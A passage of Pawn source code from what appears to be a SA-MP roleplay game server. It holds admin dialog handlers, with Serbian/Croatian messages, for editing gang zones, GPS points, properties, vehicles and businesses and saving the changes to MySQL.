	else if(dialogid == dialog_GANGZID )
	{
	    if( !response ) return 1;
        if( response )
		{
            new organizacija;

            if( sscanf( inputtext, "i", organizacija ) ) return ShowPlayerDialog( playerid, dialog_GANGZID, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesi ID orge kojoj dajete vlasnistvo.", "Potvrdi", "Odustani" );
			if( organizacija < 1 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );
			if( org_info[ organizacija ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );

            new gZone__ID = GetNearestGZone( playerid );
			if( gZone__ID == -1 ) return SendErrorMessage( playerid, "Moras biti pored teritorije." );

			gZoneInfo[ gZone__ID ][ gZoneGangSQLID ] = org_info[ organizacija ][ oID ];
   	        gZoneInfo[ gZone__ID ][ gZoneGangID ] = organizacija;
			gZoneInfo[ gZone__ID ][ gZoneTaken ] = 1;

			GZone_Refresh( gZone__ID );

			new q[ 144 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `gangzones` SET `taken` = '%d', `gang_id` = '%d' WHERE `gzone_id` = '%d'",
					gZoneInfo[ gZone__ID ][ gZoneTaken ],
					gZoneInfo[ gZone__ID ][ gZoneGangSQLID ], gZoneInfo[ gZone__ID ][ gZone_ID ] );
		   	mysql_tquery( mSQL, q );

			SendInfoMessage( playerid, "Ova zona je sad u vlasnistvu organizacije ID {FFFFFF}(%d).", organizacija );
        }
	}
	else if(dialogid == dialog_GANGZCOLOREDIT )
	{
	    if( !response ) return 1;
        if( response )
		{
            new color[24], stringic[24];
            if( sscanf( inputtext, "s[24]", color ) ) return ShowPlayerDialog( playerid, dialog_GANGZCOLOREDIT, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite boju za gang zonu.\nPrimer: FF2244", "Potvrdi", "Nazad" );

            new gZone__ID = GetNearestGZone( playerid );
			if( gZone__ID == -1 ) return SendErrorMessage( playerid, "Moras biti pored teritorije." );

            format( stringic, sizeof( stringic ), "%s", color );
            strmid( gZoneInfo[ gZone__ID ][ gZoneColor ], stringic, 0, strlen( stringic ), 255 );

            HideZoneForAll( gZoneInfo[ gZone__ID ][ gZoneID ] );

  			format( stringic, sizeof( stringic ), "0x%s66", gZoneInfo[ gZone__ID ][ gZoneColor ] );
  			ShowZoneForAll( gZoneInfo[ gZone__ID ][ gZoneID ], HexToInt( stringic ) );

            new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `gangzones` SET `color` = '%e' WHERE `gzone_id` = '%d'",
					gZoneInfo[ gZone__ID ][ gZoneColor ], gZoneInfo[ gZone__ID ][ gZone_ID ] );
		   	mysql_tquery( mSQL, q );

		    SendInfoMessage( playerid, "Uneo si boju." );
        }
	}
	else if(dialogid == dialog_GANGZEDIT )
	{
	    if( !response ) return 1;
        if( response )
		{
		    switch(listitem)
		    {
	            case 0:
				{
	                new gZone__ID = GetNearestGZone( playerid );
					if( gZone__ID == -1 ) return SendErrorMessage( playerid, "Moras biti pored teritorije." );
	                ShowPlayerDialog( playerid, dialog_GANGZID, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesi ID orge kojoj dajete vlasnistvo.", "Potvrdi", "Odustani" );
	            }
	            case 1:
				{
	                new gZone__ID = GetNearestGZone( playerid );
					if( gZone__ID == -1 ) return SendErrorMessage( playerid, "Moras biti pored teritorije." );
					if( !gZoneInfo[ gZone__ID ][ gZoneTakeable ] )
					{
					    gZoneInfo[ gZone__ID ][ gZoneTakeable ] = 1;
					    SendInfoMessage( playerid, "Postavio si zonu {FFFFFF}ID - (%d) {4282C0}da moze da se zauzima.", gZone__ID );
					}
					else if( gZoneInfo[ gZone__ID ][ gZoneTakeable ] )
					{
					    gZoneInfo[ gZone__ID ][ gZoneTakeable ] = 0;
					    SendInfoMessage( playerid, "Postavio si zonu {FFFFFF}ID - (%d) {4282C0}da ne moze da se zauzima.", gZone__ID );
					}

					new q[ 128 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `gangzones` SET `takeable` = '%d' WHERE `gzone_id` = '%d'", gZoneInfo[ gZone__ID ][ gZoneTakeable ], gZoneInfo[ gZone__ID ][ gZone_ID ] );
					mysql_tquery( mSQL, q );
	            }
	            case 2:
				{
	                new gZone__ID = GetNearestGZone( playerid );
					if( gZone__ID == -1 ) return SendErrorMessage( playerid, "Moras biti pored teritorije." );

		   	        gZoneInfo[ gZone__ID ][ gZoneGangID ] = -1;
		   	        gZoneInfo[ gZone__ID ][ gZoneGangSQLID ] = 0;
					gZoneInfo[ gZone__ID ][ gZoneTaken ] = 0;

					GZone_Refresh( gZone__ID );

					new q[ 144 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `gangzones` SET `taken` = '%d', `gang_id` = '%d' WHERE `gzone_id` = '%d'",
							gZoneInfo[ gZone__ID ][ gZoneTaken ],
							gZoneInfo[ gZone__ID ][ gZoneGangSQLID ], gZoneInfo[ gZone__ID ][ gZone_ID ] );
				   	mysql_tquery( mSQL, q );

					SendInfoMessage( playerid, "Ova zona je sad slobodna." );
				}
	            case 3: ShowPlayerDialog( playerid, dialog_GANGZCOLOREDIT, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite boju za gang zonu.\nPrimer: FF2244", "Potvrdi", "Nazad" );
	            case 4:
				{
	                new Float:Pos[ 3 ], string[130];

		            GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

		            if( GetNearestGZone( playerid ) == -1 ) return SendErrorMessage( playerid, "Moras biti u teritoriji." );
					new id = GetNearestGZone( playerid );

				    if( IsValidDynamic3DTextLabel( gZoneInfo[ id ][ gZone3D ] ) ) DestroyDynamic3DTextLabel( gZoneInfo[ id ][ gZone3D ] );
		    		if( IsValidDynamicPickup( gZoneInfo[ id ][ gZonePickup ] ) ) DestroyDynamicPickup( gZoneInfo[ id ][ gZonePickup ] );

		            gZoneInfo[ id ][ gZonePickup_X ] = Pos[ 0 ];
		            gZoneInfo[ id ][ gZonePickup_Y ] = Pos[ 1 ];
		            gZoneInfo[ id ][ gZonePickup_Z ] = Pos[ 2 ];

					gZoneInfo[ id ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ], 0, 0, .priority = 28 );
					format(string, sizeof(string), "(TERITORIJA - [%d])\nTeritorija je {FFFFFF}slobodna.\n{EB4034}Ako zelite da je zauzmete kucajte {FFFFFF}\"/zauzmi\"", id);
					gZoneInfo[ id ][ gZone3D ] = CreateDynamic3DTextLabel( string, 0xEB4034FF, gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ], 15.0, IPI, IVI, 0, 0, 0, .priority = 28 );

		            new q[ 144 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `gangzones` SET `pickup_pos_x` = '%f', `pickup_pos_y` = '%f', `pickup_pos_z` = '%f' WHERE `gzone_id` = '%d'",
							gZoneInfo[ id ][ gZonePickup_X ],
							gZoneInfo[ id ][ gZonePickup_Y ],
							gZoneInfo[ id ][ gZonePickup_Z ],
							gZoneInfo[ id ][ gZone_ID ] );
				   	mysql_tquery( mSQL, q);
	            }
	            case 5:
	            {
	                new gZone__ID = GetNearestGZone( playerid );
					if( gZone__ID == -1 ) return SendErrorMessage( playerid, "Moras biti pored teritorije." );

					if(gZoneInfo[gZone__ID][gZoneIsSpecial] == 0) 
					{
			   	        gZoneInfo[ gZone__ID ][ gZoneIsSpecial ] = 1;
						SendInfoMessage( playerid, "Ova zona je sada popularna." );
					}
					else {
			   	        gZoneInfo[ gZone__ID ][ gZoneIsSpecial ] = 0;
						SendInfoMessage( playerid, "Ova zona sada vise nije popularna." );
					}
					GZone_Refresh( gZone__ID );

					new q[ 144 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `gangzones` SET `is_special` = '%d' WHERE `gzone_id` = '%d'",
							gZoneInfo[ gZone__ID ][ gZoneIsSpecial ], gZoneInfo[ gZone__ID ][ gZone_ID ] );
				   	mysql_tquery( mSQL, q );
	            }
            }
		}
	}
	//
	else if(dialogid == dialog_GPSEDIT )
	{
	    if( !response ) return 1;
        if( response )
		{
			switch(listitem)
			{
	            case 0:
				{
	                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

				    foreach(new i : iter_GPS)
					{
						if( gpsInfo[i][gpsSQLID] != 0 )
						{
					    	format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s\n", DialogStrgEx, gpsInfo[ i ][ gpsName ] );
						}
					}
					ShowPlayerDialog( playerid, dialog_IZMENAIMENAGPS, DIALOG_STYLE_LIST, "{FFFFFF}Izaberi GPS:", DialogStrgEx, "Potvrdi", "Odustani" );
	            }
	            case 1:
				{
	                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

				    foreach(new i : iter_GPS)
					{
						if( gpsInfo[i][gpsSQLID] != 0 )
						{
					    	format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s\n", DialogStrgEx, gpsInfo[ i ][ gpsName ] );
						}
					}
					ShowPlayerDialog( playerid, dialog_IZMENAPOZGPS, DIALOG_STYLE_LIST, "{FFFFFF}Izaberi GPS:", DialogStrgEx, "Potvrdi", "Odustani" );
	            }
            }
		}
	}
	else if(dialogid == dialog_IZMENAIMENAGPS )
	{
	    if( !response ) return 1;
        if( response )
		{
            gpsid[ playerid ] = listitem;//+1;
            ShowPlayerDialog( playerid, dialog_IZMENAIMENAGPS2, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite novo ime gps lokacije:", "Potvrdi", "Odustani" );
        }
	}
	else if(dialogid == dialog_IZMENAIMENAGPS2 )
	{
	    if( !response ) return 1;
        if( response )
		{
            new gpsname[ 50 ];
            if( sscanf( inputtext, "s[50]", gpsname ) ) return ShowPlayerDialog( playerid, dialog_IZMENAIMENAGPS2, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite novo ime gps lokacije:", "Potvrdi", "Odustani" );
            if( gpsid[ playerid ] == -1 ) return SendErrorMessage( playerid, "Nemas izabranu gps lokaciju." );

			if( gpsInfo[gpsid[playerid]][gpsSQLID] == 0 ) return SendErrorMessage( playerid, "Izabrana GPS lokacija ne postoji u bazi podataka." );

			strmid( gpsInfo[ gpsid[ playerid ] ][ gpsName ], gpsname, 0, strlen( gpsname ), 50 );
			GPS_Save( gpsid[ playerid ] );

			SendInfoMessage( playerid, "Uspesno si promenio ime GPS lokacije u {FFFFFF}%s.", gpsname );
			gpsid[ playerid ] = -1;
        }
	}
	else if(dialogid == dialog_IZMENAPOZGPS )
	{
	    if( !response ) return 1;
        if( response )
		{
            new IDgps = listitem;//+1;

            GetPlayerPos( playerid, gpsInfo[ IDgps ][ gpsPos ][ 0 ], gpsInfo[ IDgps ][ gpsPos ][ 1 ], gpsInfo[ IDgps ][ gpsPos ][ 2 ] );

			GPS_Save( IDgps );

			SendInfoMessage( playerid, "Uspesno si promenio poziciju GPS lokacije {FFFFFF}%s {4282C0}na tvoju poziciju.", gpsInfo[ IDgps ][ gpsName ] );
        }
	}
	else if(dialogid == dialog_IEDIT )
	{
	    if( !response ) return 1;
        if( response )
		{
		    switch(listitem)
		    {
			    case 0: ShowPlayerDialog( playerid, dialog_ICPRICE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite zeljenu cenu imovine:", "Potvrdi", "Odustani" );
			    case 1: ShowPlayerDialog( playerid, dialog_IOPEN, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id imovine koju zelite otkljucati:", "Potvrdi", "Odustani" );
			    case 2: ShowPlayerDialog( playerid, dialog_ICLOSE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id imovine koju zelite zakljucati:", "Potvrdi", "Odustani" );
			    case 3:
				{
			        if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");
			        ShowPlayerDialog( playerid, dialog_ISELL, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti ID imovine koju zelite prodati:", "Potvrdi", "Odustani" );
				}
			}
		}
	}
	else if(dialogid == dialog_ICPRICE && response )
	{
	    new cena, imovina = GetNearestProperty( playerid );
		if( GetNearestProperty( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema imovine u vasoj blizini!" );
		if( II[ imovina ][ iOwned ] == 1 ) return SendErrorMessage( playerid, "Ne mozes da izmenis cenu kupljene kuce." );
		if( sscanf( inputtext, "d", cena ) ) return ShowPlayerDialog( playerid, dialog_ICPRICE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite zeljenu cenu imovine:", "Potvrdi", "Odustani" );
		II[ imovina ][ iPrice ] = cena;
		SaveProperty( imovina );
		PropertyRefresh( imovina );

		SendInfoMessage( playerid, "Promenili ste cenu imovine ID {FFFFFF}(%d) {4282C0}na cenu {FFFFFF}(%d).", imovina, cena );

		WriteLog("log-edit", "Admin %s je promenio cenu imovine(ID:%d) u %d", ImeIgraca( playerid ), imovina, cena);
	}
	else if(dialogid == dialog_IOPEN && response )
	{
	    new id;
		if(sscanf( inputtext, "i", id ) ) return ShowPlayerDialog( playerid, dialog_IOPEN, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id imovine koju zelite otkljucati:", "Potvrdi", "Odustani" );
		if( II[id][iSQLID] == 0 ) return SendErrorMessage( playerid, "Ta imovina ne postoji." );

		GameTextForPlayer( playerid, "Imovina ~g~otkljucana!", 3000, 3 );
		II[ id ][ iLocked ] = 0;
		SaveProperty( id );
		SendInfoMessage( playerid, "Otkljucali ste imovinu ID {FFFFFF}(%d).", id );
	}
	else if(dialogid == dialog_ICLOSE && response )
	{
	    new id;
		if(sscanf( inputtext, "i", id ) ) return ShowPlayerDialog( playerid, dialog_ICLOSE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id imovine koju zelite zakljucati:", "Potvrdi", "Odustani" );
		if( II[id][iSQLID] == 0 ) return SendErrorMessage( playerid, "Ta imovina ne postoji." );

		GameTextForPlayer( playerid, "Imovina ~r~zakljucana!", 3000, 3 );
		II[ id ][ iLocked ] = 1;
		SaveProperty( id );
		SendInfoMessage( playerid, "Zakljucali ste imovinu ID {FFFFFF}(%d).", id );
	}
	else if(dialogid == dialog_ISELL && response )
	{
	    new id;
		if(sscanf( inputtext, "i", id ) ) return ShowPlayerDialog( playerid, dialog_ISELL, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti id imovine koju zelite prodati:", "Potvrdi", "Odustani" );
		if( II[id][iSQLID] == 0 ) return SendErrorMessage( playerid, "Ta imovina ne postoji." );
		II[ id ][ iOwned ] = 0;
		II[ id ][ iOnAuction ] = true;
        II[ id ][ iNeaktivnost ] = 0;
  		II[ id ][ iOwnerSQLID ] = -1;
    	strmid( II[ id ][ iOwner ], "Drzava", 0, strlen( "Drzava" ), 32);
    	SaveProperty( id );
		PropertyRefresh( id );

    	SendInfoMessage( playerid, "Prodali ste imovinu ID {FFFFFF}(%d).", id );

		WriteLog("log-sell", "Admin %s je prodao imovinu(ID:%d)", ImeIgraca( playerid ), id);
    }
	else if(dialogid == dialog_VEDIT )
	{
	    if( !response ) return 1;
        if( response )
		{
		    switch(listitem)
		    {
			    case 0: ShowPlayerDialog( playerid, dialog_VPRICE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite zeljenu cenu vozila:", "Potvrdi", "Odustani" );
			    case 1:
				{
	    			if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
	    			if( VehicleInfo[ GetPlayerVehicleID( playerid ) ][ vSqlID ] == 0 ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u server side vozilu." );

					new autoid = GetPlayerVehicleID( playerid ), Float:Pos[ 4 ];

	                GetVehiclePos( autoid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
					GetVehicleZAngle( autoid, Pos[ 3 ] );

			        VehicleInfo[ autoid ][ vVirtualWorld ] = GetPlayerVirtualWorld( playerid );
					VehicleInfo[ autoid ][ vInterior ] = GetPlayerInterior( playerid );

					VehicleInfo[ autoid ][ vLokacijaX ] = Pos[ 0 ];
					VehicleInfo[ autoid ][ vLokacijaY ] = Pos[ 1 ];
					VehicleInfo[ autoid ][ vLokacijaZ ] = Pos[ 2 ];
					VehicleInfo[ autoid ][ vLokacijaA ] = Pos[ 3 ];

	                new q[ 256 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_pos_x` = '%f', `v_pos_y` = '%f', `v_pos_z` = '%f', `v_pos_a` = '%f', `v_virtualw` = '%d', `v_interior` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
							VehicleInfo[ autoid ][ vLokacijaX ],
							VehicleInfo[ autoid ][ vLokacijaY ],
							VehicleInfo[ autoid ][ vLokacijaZ ],
							VehicleInfo[ autoid ][ vLokacijaA ],
							VehicleInfo[ autoid ][ vVirtualWorld ],
							VehicleInfo[ autoid ][ vInterior ],
							VehicleInfo[ autoid ][ vSqlID ] );

				   	mysql_tquery( mSQL, q, "park_vehicleCheckID", "ii", -1, autoid );

					SendInfoMessage( playerid, "Preparkirali ste vozilo ID {FFFFFF}(%d).", autoid );
			    }
			    case 2:
				{
			        if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");

	    			if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
	    			if( VehicleInfo[ GetPlayerVehicleID( playerid ) ][ vSqlID ] == 0 ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u server side privatnom vozilu." );

	            	new izbor = GetPlayerVehicleID( playerid );
					SendInfoMessage( playerid, "Obrisali ste vozilo ID {FFFFFF}(%d).", izbor );

					sql_vehicles_delete( izbor );
					ResetVehicle( izbor );
					SMG_DestroyVehicle( izbor );
			    }
			    case 3:
				{
			        if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");

	    			if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
	    			if( VehicleInfo[ GetPlayerVehicleID( playerid ) ][ vSqlID ] == 0 ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u server side vozilu." );

					ShowPlayerDialog( playerid, dialog_VCOLOR, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite zeljeni ID boje 1 i ID boje 2.\nPrimer: 1 140", "Potvrdi", "Odustani" );
				}
			}
		}
	}
	else if(dialogid == dialog_VCOLOR && response )
	{
	    new boja1, boja2;

    	if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
    	if( VehicleInfo[ GetPlayerVehicleID( playerid ) ][ vSqlID ] == 0 ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u server side vozilu." );

		if( sscanf( inputtext, "dd", boja1, boja2 ) ) return ShowPlayerDialog( playerid, dialog_VCOLOR, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite zeljeni ide boje 1 i id boje 2. Primer: 1 140", "Potvrdi", "Odustani" );

        new vehicleid = GetPlayerVehicleID( playerid );

        VehicleInfo[ vehicleid ][ vColor1 ] = boja1; VehicleInfo[ vehicleid ][ vColor2 ] = boja2;

		new q[ 128 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_color_1` = '%d', `v_color_2` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
									VehicleInfo[ vehicleid ][ vColor1 ],
									VehicleInfo[ vehicleid ][ vColor2 ],
									VehicleInfo[ vehicleid ][ vSqlID ] );

		mysql_tquery( mSQL, q );

		SMG_ChangeVehicleColor( vehicleid, boja1, boja2 );

		SendInfoMessage( playerid, "Prebojali ste vozilo ID {FFFFFF}(%d) {4282C0}u boje {FFFFFF}(%d) - (%d).", vehicleid, boja1, boja2 );
	}
	else if(dialogid == dialog_VPRICE && response )
	{
	    new cena;

    	if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
    	if( VehicleInfo[ GetPlayerVehicleID( playerid ) ][ vSqlID ] == 0 ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u server side privatnom vozilu." );
		if( sscanf( inputtext, "d", cena ) ) return ShowPlayerDialog( playerid, dialog_VPRICE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite zeljenu cenu vozila:", "Potvrdi", "Odustani" );

        new vehicleid = GetPlayerVehicleID( playerid );

		VehicleInfo[ vehicleid ][ vPrice ] = cena;

		new q[ 128 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_price` = '%d' WHERE `veh_id` = '%d' LIMIT 1", VehicleInfo[ vehicleid ][ vPrice ], VehicleInfo[ vehicleid ][ vSqlID ] );
		mysql_tquery( mSQL, q );

		SendInfoMessage( playerid, "Promenili ste cenu vozila. ID = %d | Cena = %d.", vehicleid, cena );
	}
	else if(dialogid == dialog_FEDIT )
	{
	    if( !response ) return 1;
        if( response )
		{
		    switch(listitem)
		    {
			    case 0: ShowPlayerDialog( playerid, dialog_FNAME, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id i zeljeno ime firme:", "Potvrdi", "Odustani" );
			    case 1: ShowPlayerDialog( playerid, dialog_FOPEN, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id firme koju zelite otkljucati:", "Potvrdi", "Odustani" );
			    case 2: ShowPlayerDialog( playerid, dialog_FCLOSE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id firme koju zelite zakljucati:", "Potvrdi", "Odustani" );
			    case 3:
				{
			        if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");
			        ShowPlayerDialog( playerid, dialog_FSELL, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti ID firme koju zelite prodati:", "Potvrdi", "Odustani" );
				}
				case 4: ShowPlayerDialog( playerid, dialog_FCORDEXIT, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id firme, kordinate x y z int & vw\nPrimer: 2 1323.2 625.2 -2314.6 0 1", "Potvrdi", "Odustani" );
				case 5:
				{
				    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

					strcat( DialogStrgEx, "{FFFFFF}Unesite id firme i broj vrste firme koju zelite.\n" );
					strcat( DialogStrgEx, "0. 24/7 | 1. Burg | 2. Cluckin Bell | 3. Binco | 4. ((empty)) | 5. Zip | 6. Victim | 7. Suburban\n" );
			        strcat( DialogStrgEx, "8. Bar | 9. Gym | 10. Gun Shop | 11. MRestoran | 12. VRestoran | 13. Pizza | 14. Nocni klub\n" );
					strcat( DialogStrgEx, "15. Disco | 16. Electronic Shop | 17. Trafika | 18. Firma za posao | 19. Rent firma | 20. ((empty))\n" );
					strcat( DialogStrgEx, "21. Javna Kuca | 22. Kladionica | 23. Oglas | 24. ((empty)) | 25. ((empty)) | 26. ((empty))\n" );
					strcat( DialogStrgEx, "27. ((empty)) | 28. ((empty)) | 29. Lutrija | 30. Casino" );

					ShowPlayerDialog( playerid, dialog_FEDITTYPE, DIALOG_STYLE_INPUT, D_NASLOV, DialogStrgEx, "U redu", "" );

					strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				}
			}
		}
	}
	else if(dialogid == dialog_FEDITTYPE && response )
	{
	    new id, vrsta;
		if(sscanf( inputtext, "ii", id, vrsta ) )
		{
		    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

			strcat( DialogStrgEx, "{FFFFFF}Unesite id firme i broj vrste firme koju zelite.\n" );
			strcat( DialogStrgEx, "0. 24/7 | 1. Burg | 2. Cluckin Bell | 3. Binco | 4. ((empty)) | 5. Zip | 6. Victim | 7. Suburban\n" );
			strcat( DialogStrgEx, "8. Bar | 9. Gym | 10. Gun Shop | 11. MRestoran | 12. VRestoran | 13. Pizza | 14. Nocni klub\n" );
			strcat( DialogStrgEx, "15. Disco | 16. Electronic Shop | 17. Trafika | 18. Firma za posao | 19. Rent firma | 20. ((empty))\n" );
			strcat( DialogStrgEx, "21. Javna Kuca | 22. Kladionica | 23. Oglas | 24. ((empty)) | 25. ((empty)) | 26. ((empty))\n" );
			strcat( DialogStrgEx, "27. ((empty)) | 28. ((empty)) | 29. Lutrija | 30. Casino" );

			ShowPlayerDialog( playerid, dialog_FEDITTYPE, DIALOG_STYLE_INPUT, D_NASLOV, DialogStrgEx, "U redu", "" );

			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
			return 1;
		}
        if( BusinessInfo[ id ][ b_ID ] == 0 ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");

		BusinessInfo[ id ][ bType ] = vrsta;

		sql_bussines_update_integer( id, "b_type", BusinessInfo[ id ][ bType ] );
		Bussines_Refresh( id );
		SendInfoMessage( playerid, "Promenili ste promenili vrstu firme ID {FFFFFF}(%d).", id );
	}
	else if(dialogid == dialog_FCORDEXIT && response )
	{
	    new id, Float:x, Float:y, Float:z, interior, vw;
		if(sscanf( inputtext, "ifffii", id, x, y, z, interior, vw ) ) return ShowPlayerDialog( playerid, dialog_FCORDEXIT, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id firme, kordinate x y z int & vw\nPrimer: 2 1323.2 625.2 -2314.6 0 1", "Potvrdi", "Odustani" );

		if( BusinessInfo[ id ][ b_ID ] == 0 ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");

		BusinessInfo[ id ][ bInInt ] = interior;
	  	BusinessInfo[ id ][ bExitX ] = x;
	  	BusinessInfo[ id ][ bExitY ] = y;
	   	BusinessInfo[ id ][ bExitZ ] = z;
	    BusinessInfo[ id ][ bInVW ] = vw;

        new q[ 256 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_exit_x` = '%f', `b_exit_y` = '%f', `b_exit_z` = '%f', `b_exit_int` = '%d', `b_exit_vw` = '%d' WHERE `bussines_id` = '%d'",
			BusinessInfo[ id ][ bExitX ],
			BusinessInfo[ id ][ bExitY ],
			BusinessInfo[ id ][ bExitZ ],
			BusinessInfo[ id ][ bInInt ],
			BusinessInfo[ id ][ bInVW ],
			BusinessInfo[ id ][ b_ID ] );

	   	mysql_tquery( mSQL, q);

		Bussines_Refresh( id );
		SendInfoMessage( playerid, "Promenili ste promenili izlazne kordinate firme ID {FFFFFF}(%d).", id );
	}
	else if(dialogid == dialog_FNAME && response )
	{
	    new id, ime[ 64 ];
		if(sscanf( inputtext, "is[64]", id, ime ) ) return ShowPlayerDialog( playerid, dialog_FNAME, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id i zeljeno ime firme:", "Potvrdi", "Odustani" );

		if( BusinessInfo[ id ][ b_ID ] == 0 ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");

		strmid( BusinessInfo[ id ][ bName ], ime, 0, strlen( ime ), 128);
		sql_bussines_update_string( id, "b_name", BusinessInfo[ id ][ bName ] );
		Bussines_Refresh( id );
		SendInfoMessage( playerid, "Promenili ste ime firme ID {FFFFFF}(%d) {4282C0}u {FFFFFF}%s.", id, ime );
	}
	else if(dialogid == dialog_FOPEN && response )
	{
	    new id;
		if(sscanf( inputtext, "i", id ) ) return ShowPlayerDialog( playerid, dialog_FOPEN, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id firme koju zelite otkljucati:", "Potvrdi", "Odustani" );
        if( BusinessInfo[ id ][ b_ID ] == 0 ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");

		BusinessInfo[ id ][ bLocked ] = 0;
		GameTextForPlayer( playerid, "~w~Firma ~g~otkljucana!", 3000, 3 );
		sql_bussines_update_integer( id, "b_locked", BusinessInfo[ id ][ bLocked ] );
		SendInfoMessage( playerid, "Otkljucali ste firmu ID {FFFFFF}(%d).", id );
	}
	else if(dialogid == dialog_FCLOSE && response )
	{
	    new id;
		if(sscanf( inputtext, "i", id ) ) return ShowPlayerDialog( playerid, dialog_FCLOSE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id firme koju zelite zakljucati:", "Potvrdi", "Odustani" );
        if( BusinessInfo[ id ][ b_ID ] == 0 ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");

		BusinessInfo[ id ][ bLocked ] = 1;
		GameTextForPlayer( playerid, "~w~Firma ~r~zakljucana!", 3000, 3 );
		sql_bussines_update_integer( id, "b_locked", BusinessInfo[ id ][ bLocked ] );
		SendInfoMessage( playerid, "Zakljucali ste firmu ID {FFFFFF}(%d).", id );
	}
	else if(dialogid == dialog_FSELL && response )
	{
	    new id;
		if(sscanf( inputtext, "i", id ) ) return ShowPlayerDialog( playerid, dialog_FSELL, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti id firme koju zelite prodati:", "Potvrdi", "Odustani" );
        if( BusinessInfo[ id ][ b_ID ] == 0 ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");

